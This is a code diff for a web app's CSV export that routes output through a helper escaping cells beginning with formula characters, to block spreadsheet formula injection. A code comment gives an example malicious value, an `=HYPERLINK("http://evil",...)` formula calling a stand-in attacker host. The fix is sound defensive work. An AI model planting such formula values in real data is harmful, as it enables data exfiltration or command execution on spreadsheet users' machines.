@@ -4,6 +4,7 @@ import { createClient } from "@/lib/supabase/server";
 import { createAdminClient } from "@/lib/supabase/admin";
 import { logger } from "@/lib/logger";
 import { requireRole } from "@/lib/auth-context";
+import { buildCsv } from "@/lib/csv/escape";
 
 // ──────────────────────────────────────────────────────────
 // Auth helper
@@ -564,10 +565,16 @@ async function getExportContext() {
   }
 }
 
+/**
+ * W6-HIGH-05 / W4-REPORT8: CSV exports now route through `buildCsv`
+ * in `@/lib/csv/escape`, which prefixes cells starting with `=`, `+`,
+ * `-`, `@`, `\t`, `\r` with an apostrophe before quoting. Without this,
+ * a customer whose name was `=HYPERLINK("http://evil",...)` would turn
+ * into a live formula on every owner's Excel when they opened the
+ * export — data exfiltration or arbitrary DDE exec.
+ */
 function buildCSVString(headers: string[], rows: Record<string, unknown>[]): string {
-  const escape = (v: unknown) => `"${String(v ?? "").replace(/"/g, '""')}"`;
-  const dataRows = rows.map((r) => headers.map((h) => escape(r[h])).join(","));
-  return [headers.join(","), ...dataRows].join("\n");
+  return buildCsv(headers, rows);
 }
 
 // ──────────────────────────────────────────────────────────
